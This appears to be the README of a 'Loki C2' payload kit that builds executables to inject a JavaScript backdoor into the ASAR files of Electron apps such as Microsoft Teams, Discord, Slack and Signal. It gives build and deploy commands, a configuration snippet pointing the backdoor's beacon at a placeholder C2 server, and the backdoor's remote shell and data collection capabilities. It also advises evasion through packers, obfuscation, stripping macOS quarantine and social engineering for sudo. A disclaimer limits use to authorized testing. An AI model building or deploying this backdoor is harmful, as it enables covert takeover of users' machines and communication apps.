# Loki C2 - Ready Payloads

This directory contains ready-to-deploy payloads for macOS and Windows targeting vulnerable Electron applications.

## 📁 Structure

```
output/
├── README.md           ← You are here
├── windows/            ← Windows payloads
│   ├── loki_injector.py
│   ├── build.bat
│   ├── build_docker.sh
│   ├── BUILD_WINDOWS_EXE.md
│   └── README.md
└── mac/                ← macOS payloads
    ├── loki_injector_mac (executable)
    └── README.md
```

## 🎯 Quick Start Guide

### For Windows Targets

**Build the .exe:**

```bash
# Option 1: On Windows
cd windows/
build.bat

# Option 2: On macOS with Docker
cd windows/
chmod +x build_docker.sh
./build_docker.sh
```

**Deploy:**
1. Transfer `dist/loki_injector.exe` to Windows target
2. Run as Administrator
3. Done!

**Details:** See `windows/README.md`

---

### For macOS Targets

**Ready to use!**

```bash
# Transfer to macOS target
cd mac/
scp loki_injector_mac user@target:/tmp/

# Execute on target
ssh user@target
chmod +x /tmp/loki_injector_mac
sudo /tmp/loki_injector_mac
```

**Details:** See `mac/README.md`

---

## 🎯 What These Payloads Do

Both payloads automatically:

1. **Scan** for vulnerable Electron applications
   - Microsoft Teams (Primary target)
   - Discord (Secondary target)
   - Slack (Secondary target)
   - Others: Atom, Signal Desktop

2. **Install** required tools (asar) if needed

3. **Backup** original ASAR files (.backup extension)

4. **Inject** JavaScript backdoor into Electron apps

5. **Repack** ASAR files seamlessly

6. **Report** success/failure with details

## 🔧 Features

### ✅ Fully Automated
- No manual configuration required
- No dependencies on target (self-contained)
- Automatic tool installation
- Automatic backup creation

### ✅ Safe Testing
- Creates backups automatically
- Shows clear success/failure messages
- Easy rollback (restore .backup files)
- Detailed logging

### ✅ Multi-Platform
- **Windows:** .exe executable (10-15 MB)
- **macOS:** Native executable (4-5 MB)

## 🎯 Target Applications

| Application | Windows | macOS | Vulnerability | Priority |
|-------------|---------|-------|---------------|----------|
| Microsoft Teams | ✅ | ✅ | No ASAR integrity checks | **High** |
| Discord | ✅ | ✅ | No ASAR integrity checks | **High** |
| Slack | ✅ | ✅ | No ASAR integrity checks | Medium |
| Atom | ✅ | ✅ | No ASAR integrity checks | Low |
| Signal Desktop | ✅ | ✅ | No ASAR integrity checks | Low |
| VS Code | ✅ | ✅ | ⚠️ Has integrity checks | Low |

## 🚀 Backdoor Capabilities

The injected backdoor provides:

- **System Information Collection**
  - Hostname
  - Username
  - Platform/OS
  - Current working directory

- **Command Execution**
  - Remote shell commands
  - Process spawning
  - Output capture

- **C2 Beaconing**
  - Periodic check-ins (60s default)
  - Unique agent ID
  - Configurable interval

- **Stealth**
  - Runs in Electron app context
  - No additional processes
  - Legitimate app appearance

## ⚙️ Configuration

### Change C2 Server URL

Before building Windows payload, edit `windows/loki_injector.py`:

```python
# Line ~30
const cfg = {
    srv: 'https://YOUR-C2-SERVER.com',  # ← Change this
    int: 60000,  # Beacon interval (milliseconds)
    id: `${os.hostname()}_${os.userInfo().username}`
};
```

For macOS, the executable is pre-built. To change C2:
1. Edit the source Python script
2. Rebuild on macOS: `pyinstaller --onefile loki_injector.py`

## 📊 Build Information

### Windows Payload
- **Source:** `windows/loki_injector.py` (8 KB)
- **Built Size:** ~10-15 MB (includes Python runtime)
- **Format:** PE32+ executable
- **Requirements:** Administrator privileges

### macOS Payload
- **Binary:** `mac/loki_injector_mac` (4.2 MB)
- **Format:** Mach-O 64-bit executable
- **Architecture:** Universal (ARM64 + Intel)
- **Requirements:** sudo/root privileges

## 🛡️ Security Considerations

### For Penetration Testers

✅ **Legal Use Only:**
- Authorized testing only
- Obtain written permission
- Document all actions
- Follow rules of engagement

✅ **Operational Security:**
- Use VPN/proxy for C2 traffic
- Encrypt C2 communications
- Clean up after testing
- Remove backdoors when done

⚠️ **Detection Risks:**
- UAC prompt (Windows)
- Gatekeeper warning (macOS)
- AV/EDR may flag executable
- ASAR file modifications detectable
- Backup files left behind

### Evasion Techniques

**Windows:**
- Code sign the executable
- Use runtime packers (UPX, Themida)
- Apply obfuscation (see `/master-task-ai/obfuscator.py`)
- Deliver via trusted channels

**macOS:**
- Sign with Apple Developer ID
- Notarize the binary
- Remove quarantine attribute: `xattr -d com.apple.quarantine`
- Use social engineering for sudo prompt

## 📋 Testing Checklist

### Before Deployment

- [ ] C2 server URL configured
- [ ] C2 server accessible from target network
- [ ] Payload tested in lab environment
- [ ] Authorization obtained
- [ ] Backup/rollback plan ready
- [ ] Detection monitoring disabled (if authorized)

### During Deployment

- [ ] Transfer payload to target
- [ ] Execute with required privileges
- [ ] Verify injection successful
- [ ] Restart target application
- [ ] Confirm C2 beacon received
- [ ] Test command execution

### After Deployment

- [ ] Document compromised systems
- [ ] Monitor C2 activity
- [ ] Maintain access as needed
- [ ] Clean up when done (remove backdoors)
- [ ] Restore original ASAR files
- [ ] Remove payload executables

## 🔧 Troubleshooting

### Common Issues

**"No targets found"**
- Install Microsoft Teams, Discord, or Slack on target
- Verify installation paths match expected locations

**"Permission denied"**
- Run as Administrator (Windows)
- Use sudo (macOS)
- Check UAC/SIP settings

**"asar tool installation failed"**
- Install Node.js on target first
- Or embed asar in payload (advanced)

**"Backdoor not working"**
- Check C2 server URL is correct
- Verify network connectivity
- Open DevTools (F12/Cmd+Opt+I) to see console errors
- Check for [Loki] messages in console

## 📚 Documentation

- **Windows:** `windows/README.md` + `windows/BUILD_WINDOWS_EXE.md`
- **macOS:** `mac/README.md`
- **Main Project:** `/README.md`
- **Master Task AI:** `/master-task-ai/README.md`
- **Obfuscation:** `/master-task-ai/OBFUSCATION_GUIDE.md`

## 🎓 Learning Resources

### Electron Security
- [Electron Security Guidelines](https://www.electronjs.org/docs/latest/tutorial/security)
- ASAR format internals
- Context isolation bypasses

### Post-Exploitation
- Persistence techniques
- Privilege escalation
- Lateral movement
- Data exfiltration

### Detection & Defense
- EDR bypass techniques
- AV evasion methods
- Network traffic analysis
- Behavioral detection

## ✅ Next Steps

1. **Choose your target platform** (Windows or macOS)
2. **Read the platform-specific README**
3. **Configure C2 server URL** (if needed)
4. **Build the payload** (Windows only)
5. **Test in isolated lab environment**
6. **Deploy with proper authorization**
7. **Monitor and maintain access**
8. **Clean up when done**

---

## 📞 Support

For issues or questions:
- Check platform-specific READMEs
- Review `/master-task-ai/` documentation
- Consult main project README
- Test in lab before production deployment

---

**⚠️ DISCLAIMER:** These tools are for authorized security testing only. Unauthorized use is illegal and unethical. Always obtain proper permission before testing.

**Ready to deploy?** Choose your platform and follow the respective README!
